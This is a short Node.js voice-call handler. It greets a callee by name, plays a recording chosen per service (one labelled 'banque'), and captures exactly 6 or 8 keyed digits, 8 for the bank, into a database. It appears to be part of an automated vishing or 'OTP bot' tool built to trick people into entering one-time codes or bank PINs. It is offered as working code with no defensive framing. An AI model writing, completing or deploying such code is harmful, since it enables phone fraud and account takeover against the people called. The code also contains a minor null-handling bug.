module.exports = function(request, response) {
    const config = require('../config');
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');

    var input = request.body.RecordingUrl || request.body.Digits || 0;
    var callSid = request.body.CallSid;

    if (!callSid) {
        return response.status(200).json({
            error: 'Please provide the callSid.'
        });
    }

    db.get('SELECT service, name FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err) {
            return console.log(err.message);
        }

        var service = row == undefined ? 'default' : row.service;
        var name = row.name == null ? '' : row.name;

        if (config[service + 'filepath'] == undefined) service = 'default';

        var endurl = config.serverurl + '/stream/end';
        var askurl = config.serverurl + '/stream/' + service;
        var numdigits = service === 'banque' ? '8' : '6';

        const nccoEnd = [
            {
                action: "stream",
                streamUrl: [endurl]
            }
        ];

        const nccoAsk = [
            {
                action: "talk",
                text: `Hello! ${name},`
            },
            {
                action: "stream",
                streamUrl: [askurl],
                loop: 4
            },
            {   action: "input",
                maxDigits: numdigits,
                timeOut: 8
            }
        ];

        length = service === 'banque' ? 8 : 6;
        if (input.length === length && /^[0-9]+$/.test(input) && input != null) {
            respond(nccoEnd);

            db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, callSid], function(err) {
                if (err) {
                    return console.log(err.message);
                }
            });
        } else {
            respond(nccoAsk);
        }
    });

    function respond(ncco) {
        response.json(ncco);
    }
};
